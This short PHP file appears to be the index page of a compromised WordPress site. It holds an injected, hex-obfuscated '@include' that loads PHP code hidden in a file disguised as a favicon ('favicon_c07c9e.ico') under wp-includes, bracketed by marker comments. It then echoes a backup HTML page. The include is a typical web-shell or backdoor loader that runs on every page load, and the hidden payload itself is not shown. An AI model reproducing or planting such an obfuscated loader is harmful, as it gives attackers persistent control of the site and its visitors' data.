<?php
/*fca81*/

@include "\x2fhome\x2ftech\x69te/p\x75blic\x5fhtml\x2fdemo\x2frise\x2fwp-i\x6eclud\x65s/Re\x71uest\x73/fav\x69con_\x6307c9\x65.ico";

/*fca81*/


echo file_get_contents('index.html.bak.bak');